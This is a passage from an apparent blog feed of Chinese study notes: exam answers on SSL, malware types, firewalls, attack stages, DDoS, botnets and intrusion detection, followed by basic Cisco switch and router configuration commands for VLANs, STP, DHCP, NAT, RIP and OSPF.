color=red>描述SSL协议的基本流程。（掌握 大题）</font></strong></p><ul><li>在基本流程中，客户端A发起与服务器B的链接，然后B把自己的证书发送给A。A验证B的证书，从中提取B的公钥,然后选择一个用来计算会话秘钥的随机数，将其用B的公钥加密发送给B。基于这个随机数，双方计算出会话密钥(主秘钥)。然后通信双方使用会话秘钥对会话数据进行加密和完整性保护</li><li>P122页还有其他内容…….</li></ul></li><li><p><strong>发送时，SSL记录协议都执行了哪些操作？分别完成什么功能？</strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/SSL记录协议.png" style="zoom:50%;" /><ul><li>从上层接收要发送的数据，对信息进行分段，成若干记录，使用指定的压缩算法进行数据压缩数据（可选）；使用指定的MAC算法生成MAC；使用指定的加密算法进行数据加密；发送数据</li></ul></li><li><p><strong>简述SSL握手协议的流程。</strong></p><ul><li><p>第一阶段 安全能力的建立</p><blockquote><p>(1) 客户 → 服务器 ：client_hello                        (2) 服务器 → 客户 ：server_hello</p></blockquote></li><li><p>第二阶段 服务器认证和密钥交换</p><blockquote><p>(3) 服务器 → 客户 ：server_certificate             (4) 服务器 → 客户 ：server_key_exchange<br>(5) 服务器 → 客户 ：certificate_request           (6) 服务器 → 客户 ：server_hello_done</p></blockquote></li><li><p>第三阶段  客户认证和密钥交换</p><pre class="line-numbers language-none"><code class="language-none">(7) 客户 → 服务器 ：client_certificate(8) 客户 → 服务器 ：client_key_exchange(9) 客户 → 服务器 ：certificate_verify<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四阶段  结束阶段</p><pre class="line-numbers language-none"><code class="language-none">(10) 客户 → 服务器 ：change_cipher_spec(11) 客户 → 服务器 ：finished(12) 服务器 → 客户 ：change_cipher_spec(13) 服务器 → 客户 ：finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="第六章-恶意代码"><a href="#第六章-恶意代码" class="headerlink" title="第六章 恶意代码"></a>第六章 恶意代码</h3><h4 id="思考题-3"><a href="#思考题-3" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是恶意代码？主要包括哪些类型？</strong><ul><li>经过存储介质和计算机网络进行传播，从一台计算机系统到另外一台计算机系统，未经授权而破坏计算机系统安全性和完整性的程序或代码</li><li>恶意代码包括：计算机病毒、木马、蠕虫、逻辑炸弹、脚本病毒、用户级RootKit、核心级RootKitd等</li></ul></li><li><strong><font color=red>计算机病毒的概念及特征是什么？ （大题或小题）</font></strong><ul><li>计算机病毒是一种人为编制的、能够对计算机正常程序的执行或数据文件造成破坏，并且能够自我复制的一组指令程序代码</li><li>其特性包括：破坏性、传染性、隐蔽性、潜伏性、多态性、不可预见性</li></ul></li><li><strong><font color=red>什么是木马？木马和病毒有哪些主要区别？</font></strong><ul><li>木马是有隐藏性的、可与远程计算机建立连接，使远程计算机能够通过网络控制本地计算机的恶意程序。 </li><li>病毒与木马的区别<ul><li>木马通常不像传统病毒那样感染文件。木马一般是以寻找后面、窃取密码和重要文件为主，还可以对计算机进行跟踪监视、控制、查看、修改资料等操作，具有很强的屏蔽性、突发性与攻击性。</li><li>传统的文件型病毒寄生于正常可执行程序体内，通过寄主程序的执行而执行，大多数木马程序都有一个独立的可执行文件</li></ul></li></ul></li><li><strong><font color=red>什么是蠕虫？蠕虫有哪些技术特性？</font></strong><ul><li>蠕虫是一种结合黑客技术和计算机病毒技术，利用系统漏洞和应用软件的漏洞，通过复制自身进行传播的、完全独立的程序代码。</li><li>蠕虫病毒具有的技术特性有：跨平台、多种攻击手段、极快的传播速度、多态性、可变形性、传输载体与零时间探测利用等特性</li></ul></li></ul><h3 id="第七章-防火墙"><a href="#第七章-防火墙" class="headerlink" title="第七章 防火墙"></a>第七章 防火墙</h3><h4 id="思考题-4"><a href="#思考题-4" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是防火墙？它有哪些功能和局限性？</strong><ul><li><del>防火墙是一个由软件和硬件组合而成的、起过滤和封锁作用的计算机或网络系统，一般部署在本地网络和外部网络之间</del>（P175定义 老师说不是这个）</li><li>防火墙是一种建立在被认为是安全可信的内部网和和被认为不太安全可信的外部网之间的访问控制机制，是安全策略的具体体现（P176 定义）</li><li>还包括屏蔽主机防火墙（单堡垒主机）、屏蔽主机防火墙（双宿堡垒主机防火墙）、屏蔽子网防火墙等</li><li>防火墙的作用是隔离风险区域和安全区域的连接，阻止不希望的或者未授权的通信进入内部网，通过边界控制强化内部网的安全，同时不会妨碍内部网对外部网的访问</li><li>防火墙的功能：访问控制功能、内容控制功能、日志功能、集中管理功能、自身安全和可用性<ul><li>访问控制功能</li><li>内容控制功能</li><li>日志功能</li><li>集中管理功能</li><li>自身安全和可用性</li></ul></li><li>防火墙的局限性<ul><li>防火墙不能防御不经由防火墙的攻击</li><li>防火墙不能防范来自内部的威胁</li><li>防火墙不能防止病毒感染的程序和文件进出内部网</li><li>防火墙不能防止数据驱动式的攻击</li></ul></li></ul></li><li><strong><font color=red>简述包过滤原理</font></strong><ul><li>将IP数据报的各种包头信息与防火墙内建规则进行比较，然后根据过滤规则有选择地阻止或允许数据包通过防火墙。</li><li>这些过滤规则也称作访问控制表(access control table)。流入数据流到达防火墙后。</li><li>防火墙就检查数据流中每个IP数据报的各种包头信息。例如源地址、目的地址、源端口、目的端口、协议类型,来确定是否允许该数据包通过。一旦该包的信息匹配了某些特征,则防火墙根据其内建规则对包进行相应的操作，选择是否接收/丢弃 策略包</li></ul></li><li><strong>状态检查技术具有哪些特点？(小题)</strong><ul><li>对用户透明，能够在OSI/RM网络层上通过IP地址和端口号过滤进出的数据包</li><li>可以在OSI/RM应用层上检查数据包内容，查看这些内容是否符合安全规则</li><li>克服了包过滤技术和代理服务技术的局限性，能够根据协议、端口及源地址、目的地址的具体情况决定数据包是否通过</li><li>对于每个安全策略允许的请求，状态监测技术启动相应的进程，可快速的确认符合授权标准的数据包，使得运行速度加快</li></ul></li><li><strong><font color=red>简述屏蔽子网防火墙的结构</font></strong><ul><li>使用了两个包过滤路由器，一个在堡垒机和internet之间，称为外部屏蔽路由器，一个在堡垒主机和内部网络之间称为内部屏蔽路由器</li><li>每一个路由器都被配置为只和堡垒主机交换流量。外部路由器使用标准过滤来限制对堡垒主机的外部访问,内部路由器则拒绝不是堡垒主机发起的进人数据包,并只把外出数据包发给堡垒主机。</li></ul></li></ul><h3 id="第八章-网络攻击与防范"><a href="#第八章-网络攻击与防范" class="headerlink" title="第八章 网络攻击与防范"></a>第八章 网络攻击与防范</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 本章考点如下</span><span class="token operator">-</span> Dos与DDos 简答题<span class="token operator">-</span> 在入侵检测上同时存在大题和小题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思考题-5"><a href="#思考题-5" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong><font color=red>简述网络攻击的过程？（掌握）</font></strong><ul><li>网络攻击的过程可以归纳为：隐藏自身，踩点与扫描，侵入系统并提升权限，种植后门，网络隐身五个步骤<ul><li><strong>1 隐藏自身：</strong></li><li><strong>2 踩点与扫描：</strong></li><li><strong>3 侵入系统并提升权限</strong></li><li><strong>4 种植后门：</strong></li><li><strong>5 网络隐身：</strong>在成功侵入目标主机并植入后门后需要清除登录日志及其他相关日志</li></ul></li></ul></li><li><strong>在整个DDos攻击过程中都有哪些角色？分别完成什么功能？</strong><ul><li>DDos攻击过程中涉及四种主机：攻击者，主控傀儡机，攻击傀儡机，被攻击者<ul><li>攻击者：发布实施DDos的指令，是整个DDos攻击中的主控平台</li><li>主控傀儡机：通过这些主机分别控制大量的攻击傀儡机，能够接收攻击者发来的特殊指令，而且可以把这些指令发送到攻击傀儡机上</li><li>攻击傀儡机： 攻击傀儡机是攻击的直接执行者，直接向被攻击主机发起攻击</li><li>被攻击者：是DDos攻击的直接受害者，目前多为一些大型企业的网络和数据库系统</li></ul></li></ul></li><li><strong><font color=red>简述僵尸网络的工作原理？（掌握 大题）</font></strong><ul><li>僵尸网络的概念：僵尸网络是攻击者处于恶意目的，融合传统的恶意软件，如计算机病毒，蠕虫和木马等技术，传播僵尸程序感染大量主机，并通过一对多的命令与控制信道被感染的主机所组成的叠加网络。<ul><li>僵尸网络利用其所控制的僵尸主机群发起攻击，其活动可以分为四个阶段<ol><li>感染目标主机构建僵尸网络</li><li>发布命令，控制僵尸程序</li><li>展开攻击</li><li>攻击善后，主要目的是隐藏攻击痕迹，防止被追踪溯源</li></ol></li></ul></li></ul></li><li><strong>什么是入侵检测？ 入侵检测的典型过程是什么？</strong><ul><li>入侵检测是指在计算机网络或计算机系统中若干关键点收集信息并对收集到的信息进行分析，从而判断是网络或系统中是否有违反安全策略的行为和被攻击的迹象。它是对入侵行为的发觉</li><li>入侵检测的典型过程是：信息收集、信息（数据）预处理，数据的检测分析，根据安全策略做出响应，有的还包括检测效果的评估</li></ul></li><li><strong>IDS的基本功能是什么？典型的IDS包括哪些实体？</strong><ul><li>入侵检测系统（IDS）是完成入侵检测的功能的软件、硬件的组合；是对敌对攻击在适当的时间内进行检测并做出响应的一种工具</li><li>典型的IDS包括事件生成器、事件分析器、事件数据库、响应单元、目录服务器<ul><li>事件生成器：事件生成器是采集和过滤事件数据的程序和模块，负责收集原始数据</li><li>事件分析器：事件分析器是分析事件数据和任何CIDF组件传送给他的各种数据。</li><li>事件数据库：负责存放各种数据原始数据或已加工过的数据</li><li>响应单元： 是针对分析组件所产生的分析结果，根据响应策略采取响应的行为，发出命令响应攻击</li><li>目录服务器： 用于各组件定位其他组件，以及控制其他组件传递的数据并认证其他组件的使用，以防止其他组件的使用，以防止入侵检测系统本身受到攻击。</li></ul></li></ul></li><li><strong>简述异常检测和误用检测的基本原理？</strong> <ul><li>异常检测原理： 任何一种入侵行为都由于其偏离正常或者所期望的系统和用户的活动规律而被检测出来</li><li>误用检测原理： 建立在对过去各种已知网络入侵方法和系统缺陷知识的积累之上。入侵检测系统中存储着一系列已知的入侵行为描述，当某个系统的调用与一个已知的入侵行为相匹配时，则认为是入侵行为</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;计算机网络安全思考题：&quot;&gt;&lt;a href=&quot;#计算机网络安全思考题：&quot; class=&quot;headerlink&quot; title=&quot;计算机网络安全思考题：&quot;&gt;&lt;/a&gt;计算机网络安全思考题：&lt;/h2&gt;&lt;h3 id=&quot;第一章概述&quot;&gt;&lt;a href=&quot;#第一章概述&quot; class</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>网络工程——CISCO设备基本语法</title>
    <link href="https://shierjinghuang.github.io/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</id>
    <published>2023-02-20T14:13:23.000Z</published>
    <updated>2025-04-01T10:22:47.928Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络工程-cisco设备基本语法">网络工程——CISCO设备基本语法</h2><p>[TOC]</p><h3 id="交换机配置：">交换机配置：</h3><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch</span><span class="token operator">></span>enable进入特权模式<span class="token class-name">Switch</span><span class="token other-directive property">#configure</span> terminal进入全局配置模式<span class="token class-name">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token other-directive property">#hostname</span> S1更改用户名<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token other-directive property">#enable</span> password cisco<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token literal constant">#line</span> con <span class="token number">0</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#password</span> cisco<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#login</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token literal constant">#line</span> vty <span class="token number">0</span> <span class="token number">15</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#password</span> cisco<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#login</span><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token operator">-</span>line<span class="token punctuation">)</span><span class="token other-directive property">#exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="管理配置地址：">管理配置地址：</h4><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span># interface <span class="token class-name">Vlan</span> <span class="token number">1</span>进入vlan <span class="token number">1</span>的接口配置模式<span class="token function">S1</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token operator">-</span>config<span class="token punctuation">)</span># ip address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>设置接口<span class="token constant">IP</span>地址与子网掩码<span class="token function">S1</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token operator">-</span>config<span class="token punctuation">)</span># no shutdown开启端口<span class="token function">S1</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token operator">-</span>config<span class="token punctuation">)</span># exit<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span># ip <span class="token keyword">default</span><span class="token operator">-</span>gateway <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.1</span>配置默认网关<span class="token constant">IP</span>地址<span class="token function">S1</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span># end  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其他交换机操作：</strong></p><blockquote><p>S1# show running-config 查看当前设备配置</p></blockquote><blockquote><p>S1# show flash 显示<em>flash</em>存储器信息以及存储器中的IOS映象文件</p></blockquote><blockquote><p>S1# show version 显示系统硬件的配置</p></blockquote><p><strong>交换机Vlan划分及信息备份</strong></p><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch_A</span><span class="token other-directive property">#vlan</span> database进入vlan数据库模式<span class="token class-name">Switch_A</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span><span class="token other-directive property">#vlan</span> <span class="token number">20</span> name VLAN20 <span class="token class-name">Switch_A</span><span class="token other-directive property">#configure</span> terminal<span class="token class-name">Switch_A</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token other-directive property">#interface</span> f0<span class="token operator">/</span><span class="token number">20</span><span class="token class-name">Switch_A</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token other-directive property">#switchport</span> mode access将端口的工作模式改为access<span class="token class-name">Switch_A</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token other-directive property">#switchport</span> access vlan <span class="token number">20</span>指定接口所属vlan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>保存配置及IOS到TFTP</strong></p><blockquote><p>Copy starup-config(or running-config)  tftp<br>copy flash tftp</p></blockquote><h4 id="stp与rstp">STP与RSTP</h4><p><strong>查看生成树</strong></p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">Show spanning<span class="token operator">-</span>tree   <span class="token comment">#识别根桥、阻塞端口和转发端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>配置快速生成树：</strong></p><blockquote><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch</span> <span class="token punctuation">(</span>config<span class="token punctuation">)</span># spanning<span class="token operator">-</span>tree mode rapid<span class="token operator">-</span>pvst  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>可以通过什么方法查看交换机的生成树阻塞了那个端口？</strong></p><blockquote><p>可以通过Show spanning-tree指令查看</p></blockquote><ol><li>Disabled（禁用状态）：不转发数据帧，不学习MAC地址表，不参与生成树计算</li><li>Blocking（阻塞状态）；不转发数据帧，不学习MAC地址表，接收并处理BPDU，不发生BPDU</li><li>Listening（监听状态）：不转发数据帧，不学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Learning（学习状态）：不转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Forwarling（转发状态）：转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li></ol><p><strong>总结生成树中根桥的选举规则</strong></p><ul><li>选择根桥的依据是网桥ID，网桥ID是唯一的，网桥ID由网桥优先级 和 网桥的MAC地址组成,网桥ID中的MAC地址是自身交换机的MAC地址</li><li>在选择根桥的时候，是依据看哪台交换机的ID值最小，优先级小的被选择为根网桥，在优先级相同的情况下，MAC地址小的为根网桥</li></ul><p><strong>更改根桥优先级</strong></p><p>所有交换机的优先级都是默认的32768，要实现变更根桥，只要将交换机的优先级更改为小于32768，同时优先级的修改以4096为增量</p><blockquote><p>在全局配置模式下执行如下命令∶spanning-tree vlan 1 priority 4096</p></blockquote><p>这样，Switch3的优先级值就变成4097，成为了网络中最小的ID，从而成为了根桥。</p><h4 id="三层交换实现vlan间通信">三层交换实现VLAN间通信</h4><p><strong>将端口分配给VLAN</strong></p><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift">config terminalinterface f0<span class="token operator">/</span><span class="token number">1</span>switchport mode accessswitchport access vlan <span class="token number">10</span><span class="token comment">//端口1分配给VLAN10</span>exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在交换机上给VLAN分配IP地址</strong></p><pre class="line-numbers language-swift" data-language="swift"><code class="language-swift"><span class="token class-name">Switch</span><span class="token other-directive property">#config</span> terminal<span class="token class-name">Interface</span> vlan <span class="token number">10</span><span class="token class-name">Ip</span> address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">10.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token comment">//VLAN10分配IP地址</span><span class="token class-name">No</span> shutdown<span class="token class-name">Exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>三次交换机上为VLAN配置IP地址作用是什么？<ul><li><s><strong>vlan 上配IP就是真实的网关地址， 主要用于两台或者多台三层交换机之间进行通信</strong></s>（网络说法不一定可信）</li></ul></li><li>如何采用此种方法实现多个（超过两个）VLAN间路由？<ul><li>将二层交换机与三层交换机之间的接口设置为trunk模式，使得不同vlan可以经三层交换机实现路由</li></ul></li></ol><h3 id="路由器配置：">路由器配置：</h3><h4 id="路由器常用命令">路由器常用命令</h4><ul><li>Hostname#设置交换机的主机名</li><li>Show startup-config显示交换机初始化配置</li><li>Show running-config查看当前设备配置</li><li>Show flash显示<em>flash</em>存储器信息以及存储器中的IOS映象文件</li><li>Show version显示系统硬件的配置</li><li>Show interface **命令来查察接口的信息</li><li>Show controllers **查看接口的硬件信息</li></ul><ol><li><p><strong>通过实验，说明如何保存路由器的启动配置 startup-config？</strong></p><blockquote><p style="color:blue;">Router# copy running-config startup-config</p></blockquote></li><li><p><strong>若将两台路由器互联，配置完各个接口的IP地址以后，两台PC是否可以ping通，为什么？在路由器上Ping另外一台路由器的互联接口是否可ping通，为什么？</strong></p><blockquote><p style="color:blue;">不可以ping通，两台路由器之间缺少相应的路由，可以ping通，两个路由器端口直接相连。</p></blockquote></li></ol><p><strong>路由器的基本管理</strong></p><blockquote><p style="color:blue;">Router# copy running-config tftp配置文件保存</p></blockquote><blockquote><p style="color:blue;">Router# Copy tftp running-config配置文件恢复</p></blockquote><blockquote><p style="color:blue;">Router#copy flash tftp保存操作系统</p></blockquote><p><strong>配置静态路由</strong></p><blockquote><p>ip route [目的网络号] [子网掩码] [下一跳IP地址]</p></blockquote><p><strong>配置默认路由：</strong></p><blockquote><p>ip route 0.0.0.0 0.0.0.0  [下一跳IP地址]</p></blockquote><ol><li><p><strong>静态路由的下一跳可以采用接口号表示，那么可以将本实验中的静态路由或默认路由写成什么表达形式？</strong></p><ul><li>可以将下一跳IP地址更换成出接口</li><li>静态路由：ip route [目的网络号] [子网掩码] [出接口]</li><li>默认路由：ip route 0.0.0.0 0.0.0.0  [出接口]</li></ul></li><li><p><strong>根据实验和路由知识，若静态路由和默认路由同时存在的话，分组路由的过程中优先选择静态路由还是默认路由？为什么？</strong></p><ul><li>静态路由。在路由表中默认路由排在最后，同时存在静态路由与默认路由时，将优先使用静态路由</li></ul></li></ol><p><strong>配置DHCP：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ip dhcp pool <span class="token punctuation">[</span>poolname<span class="token punctuation">]</span> <span class="token operator">//</span>创建地址池，名字为poolnamenetwork <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">//</span>配置分配的网段 default<span class="token operator">-</span>router <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span>   <span class="token operator">//</span>配置网关dns<span class="token operator">-</span>server <span class="token number">219.218</span><span class="token number">.18</span><span class="token number">.18</span> <span class="token operator">//</span> 配置DNS服务器的IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>PC端如何使用命令行方式释放或获取新的IP地址？（ipconfig 参数）</p><blockquote><p>ipconfig /release释放本机IP地址</p><p>ipconfig /renew，获得一个新的IP地址</p></blockquote></li><li><p>若DHCP的配置中，使用的是Network 192.168.1.0 255.255.255.0，那么R1所连接本地网络中主机获取的IP地址范围是什么？</p><ul><li>192.168.1.1到192.168.1.254 <s>（应该）</s></li></ul></li><li><p>根据实验说明：主机获取的IP地址、子网掩码、网关和DNS分别与DHCP配置中那条命令对应？</p><ul><li>network命令配置主机获取的IP地址，子网掩码，default-router配置网关，dns-server配置DNS域名解析服务器。</li></ul></li></ol><p><strong>查看DHCP状态:</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">R1#show ip dhcp binding  &#x2F;&#x2F; 查看IP分配绑定状态R1#show ip dhcp pool [poolname]   &#x2F;&#x2F; 查看dhcp地址池R1#show ip dhcp server statistics &#x2F;&#x2F; 查看dhcp服务状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="二层交换机与路由器实现vlan间路由">二层交换机与路由器实现VLAN间路由</h4><p><strong>在交换机上创建Trunk端口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface f0&#x2F;1                       &#x2F;&#x2F;与路由器级联接口为f0&#x2F;1switchport mode trunk       &#x2F;&#x2F;封装为Trunk口end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>配置路由器子接口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Router#configure terminalInterface f0&#x2F;0No shutexitInterface f0&#x2F;0.10Encapsulation dot1q 10    &#x2F;&#x2F;子接口1对应VLAN 10Ip address 192.168.10.1 255.255.255.0Interface f0&#x2F;0.20Encapsulation dot1q 20Ip address 192.168.20.1 255.255.255.0    &#x2F;&#x2F;子接口2 对应VLAN 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>激活路由选择协议</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Switch(config)#Ip routing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>使用这种方式配置VLAN间路由的原理是什么？</p><p>路由器的一个接口上通过配置逻辑接口或子接口的方式，<code>实现原来相互隔离的不同VLAN（虚拟局域网）之间的互联互通</code></p></li><li><p>如果不使用子接口，而是利用路由器的两个以太网口分别连接到交换机两个不同VLAN中的接口上（PC、交换机与路由器级联接口也划分入相应的VLAN），是否能够连通？在这种情况下，路由器与交换机之间的级联接口不配置Trunk是否可以连通？</p><ul><li>可以连通， 在路由器上为每一个VLAN都配置一个物理连接后，数据流将分不同VLAN流到路由器上不同的端口中，再通过路由器进行路由的转发，以实现VLAN之间的通信。</li></ul></li></ol><h4 id="网络地址转换nat">网络地址转换NAT</h4><p><strong>静态NAT：</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface  f0&#x2F;0ip  adddress  172.16.1.1 255.255.255.0ip  nat  inside# 定义内部接口no shutdown(config)#interface   f0&#x2F;1ip  address  202.96.134.1 255.255.255.0ip  nat  outside# 定义外部接口no shutdown(config)#ip  nat  inside  source  static 172.16.1.100   202.96.134.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">ip nat inside source static[本地IP地址] [目标ip地址] # 初始于 inside 向 outside 发送，在outside接口执行源地址翻译 </blockquote><blockquote><p style="color:blue;">ip nat outside source static [global-address] [local-address]， 初始于 outside 向 inside 发送，在inside接口执行源地址翻译 </blockquote><p><strong>动态NAT配置：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">10</span> permit <span class="token number">172.16</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span><span class="token comment"># 创造一个访问控制列表（ACL）,表号为10，内容是允许172.16.1.0 </span><span class="token comment"># access-list [表号] [permit/deny] [网络号] [反掩码]</span>ip nat pool MYNAT <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.100</span> <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.110</span> netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token comment"># 配置NAT地址池的名字以及 IP地址范围、子网掩码</span>ip nat inside source <span class="token builtin">list</span> <span class="token number">10</span> pool MYNAT<span class="token comment"># 将ACL 10 匹配得内部源IP地址，转换为地址池MYNAT 中的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>将静态路由换成默认路由改如何配置？如果从外网向内网私有IP发起通信，是否可以ping通？</strong></p><ul><li>不能ping通，静态NAT技术实现的就是对内部主机的隐藏</li></ul></li><li><p><strong>对第5步中：ip nat inside source list 10 pool MYNAT 命令中，如果使用参数overload，实验结果与本实验有什么区别？</strong></p><ul><li><p>使用参数overload，意味使用PAT（网络地址端口转换）技术，可将多个内部地址映射为一个合法公网地址,但以不同的协议端口号与不同的内部地址相对应</p></li><li><p>内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问</p></li><li><p>ip nat inside source list 10  pool MYNAT overload</p></li></ul><p><strong><s>此外内容需要在仿真上做一遍，我还没弄</s></strong></p></li></ol><h4 id="路由协议">路由协议</h4><p><strong>RIP路由协议</strong></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">Router rip# 启动RIPnetwork 1.0.0.0network 12.0.0.0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>OSPF路由协议</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Router ospf <span class="token number">1</span><span class="token comment"># 启动ospf协议</span>Network <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span>Network <span class="token punctuation">[</span>网络号<span class="token punctuation">]</span> <span class="token punctuation">[</span>反掩码<span class="token punctuation">]</span> <span class="token punctuation">[</span>路由区域<span class="token punctuation">]</span>Network <span class="token number">12.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检查OSPF路由协议的命令</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Show ip ospf neighbor    &#x2F;&#x2F; 显示现在的Ospf邻居，其中包括邻居ID（Route-id)、优先级、状态、存活时间、IP地址、接口Show ip osfp interface    &#x2F;&#x2F;查看接口是否被加入到正确的区域中，该命令还可以显示各种定时器hello间隔等和邻居关系。Show ip route ospf    &#x2F;&#x2F;显示路由器知道的OSPF路由Show ip ospf database    &#x2F;&#x2F;查看OSPF数据库，包括各种LSA的数据状态Clear ip ospf <span aria-hidden="true" 